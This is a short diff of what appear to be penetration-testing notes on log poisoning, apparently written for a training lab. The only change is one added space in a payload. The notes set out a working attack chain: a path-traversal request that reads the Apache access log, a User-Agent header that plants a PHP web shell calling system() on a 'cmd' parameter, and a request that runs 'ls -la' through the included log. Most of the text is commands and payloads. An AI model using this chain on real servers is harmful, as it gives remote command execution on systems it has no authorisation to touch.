@@ -2,7 +2,7 @@ If you have access to log files, try log poisoning.
 
 1. First, curl the log file to see which header is logged in the file. == curl http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../var/log/apache2/access.log
 
-2. Replace that header with this code == "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" >> "Mozilla/5.0<?php echo system($_GET['cmd']); ?>"
+2. Replace that header with this code == "Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0" >> "Mozilla/5.0 <?php echo system($_GET['cmd']); ?>"
 
 3. Attempt to use the command using a GET like this == /pizza/index.php?page=../../../../../../../../var/log/apache2/access.log&cmd=ls -la
 
